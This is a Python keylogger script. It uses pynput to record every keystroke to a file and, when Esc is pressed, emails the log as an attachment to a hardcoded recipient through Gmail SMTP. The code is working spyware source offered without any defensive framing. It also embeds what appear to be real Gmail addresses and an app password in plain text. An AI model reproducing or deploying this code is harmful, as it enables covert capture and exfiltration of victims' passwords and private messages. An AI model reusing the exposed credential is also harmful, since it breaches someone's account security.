from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

log_file = "keystrokes.txt"

# Email configuration - Replace these with your actual details
sender_email = "jrbotics.eshwarg@gmail.com"  
sender_password = "ltmb cfeo vbth llux"  
recipient_email = "eshwarg1432@gmail.com"  
smtp_server = "smtp.gmail.com"
smtp_port = 587

def send_email():
    if not os.path.exists(log_file):
        print("No log file to send.")
        return
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = "Keylog Report"
    
    # Attach the log file
    try:
        with open(log_file, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename= {log_file}'
        )
        msg.attach(part)
        
        # Send email
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()
        print("Log sent via email.")
    except smtplib.SMTPAuthenticationError as e:
        print(f"Email authentication failed: {e}")
        print("Fix: Enable 2FA on your Gmail, generate an 'app password' at https://myaccount.google.com/apppasswords, and use that instead of your regular password.")
        print("Do NOT use your regular Gmail password—Gmail blocks it for security.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped.")
        send_email()
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press Esc to stop and send log.")
    listener.join()
